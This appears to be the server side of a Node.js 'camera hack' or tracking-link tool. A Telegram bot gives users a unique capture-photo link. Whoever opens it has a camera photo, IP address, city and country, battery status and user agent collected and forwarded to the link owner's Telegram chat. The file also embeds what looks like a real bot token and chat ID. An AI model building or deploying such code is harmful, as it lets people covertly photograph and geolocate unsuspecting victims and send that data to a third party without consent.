const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid'); // For generating unique filenames

const app = express();
const port = 3000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7201017810:AAFMwpK0x_VK0liYn40CWA7o5i9Jxn4j_w4';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5045459233';

app.use(express.json());
app.use(express.static('public'));

// Convert data URI to Buffer
function dataURItoBuffer(dataURI) {
    const base64Data = dataURI.split(',')[1];
    return Buffer.from(base64Data, 'base64');
}

// Save image buffer to file
function saveImageBuffer(buffer, filePath) {
    return new Promise((resolve, reject) => {
        fs.writeFile(filePath, buffer, err => {
            if (err) return reject(err);
            resolve();
        });
    });
}

// Send photo and user agent details to Telegram
async function sendPhotoAndUserAgentToTelegram(dataURL, userAgent) {
    const buffer = dataURItoBuffer(dataURL);
    const uniqueFileName = `photo_${uuidv4()}.png`;
    const filePath = path.join(__dirname, 'images', uniqueFileName);

    try {
        // Ensure the images directory exists
        if (!fs.existsSync(path.dirname(filePath))) {
            fs.mkdirSync(path.dirname(filePath), { recursive: true });
        }

        // Save image
        await saveImageBuffer(buffer, filePath);

        // Prepare form data for Telegram
        const formData = new FormData();
        formData.append('photo', fs.createReadStream(filePath));
        formData.append('caption', `User Agent: ${userAgent}`);
        formData.append('chat_id', TELEGRAM_CHAT_ID);

        // Send photo to Telegram
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, formData, {
            headers: { ...formData.getHeaders() }
        });

        if (response.status === 200) {
            console.log('Photo and user agent details sent to Telegram successfully');
        } else {
            throw new Error(`Failed to send photo and user agent details to Telegram: ${response.statusText}`);
        }

        // Clean up the saved image
        fs.unlink(filePath, err => {
            if (err) console.error('Error deleting file:', err);
        });

    } catch (error) {
        console.error('Error sending photo and user agent details to Telegram:', error);
    }
}

// Get public IP and geolocation
app.get('/ip', async (req, res) => {
    try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        const ip = ipResponse.data.ip;

        const geoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
        const geolocation = geoResponse.data;

        res.json({ ip, geolocation });
    } catch (error) {
        console.error('Error fetching IP and geolocation:', error);
        res.status(500).send('Error fetching IP and geolocation');
    }
});

// Receive device information
app.post('/device-info', async (req, res) => {
    const deviceInfo = req.body;
    console.log('Device Info:', deviceInfo);

    const message = `
Device Information:
- IP: ${deviceInfo.ip}
- Geolocation: ${deviceInfo.geolocation.city}, ${deviceInfo.geolocation.country}
- Battery Percentage: ${deviceInfo.batteryPercentage}%
- Charging Status: ${deviceInfo.chargingStatus}
- User Agent: ${deviceInfo.userAgent}
    `;

    try {
        // Send device information message to Telegram
        await sendMessageToTelegram(message);

        // Send the photo and user agent
        await sendPhotoAndUserAgentToTelegram(deviceInfo.photo, deviceInfo.userAgent);

        res.send('Device info received');
    } catch (error) {
        console.error('Error processing device info:', error);
        res.status(500).send('Error processing device info');
    }
});

// Function to send message to Telegram
function sendMessageToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    return axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message
    })
    .then(response => {
        if (response.status === 200) {
            console.log('Message sent to Telegram');
        } else {
            throw new Error('Failed to send message to Telegram');
        }
    })
    .catch(error => {
        console.error('Error sending message to Telegram:', error);
    });
}

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});

// Create a bot instance
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// Handle /start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'HEY, YOUR LINK IS:- https://your-server-url/capture-photo?chatId=' + chatId);
});
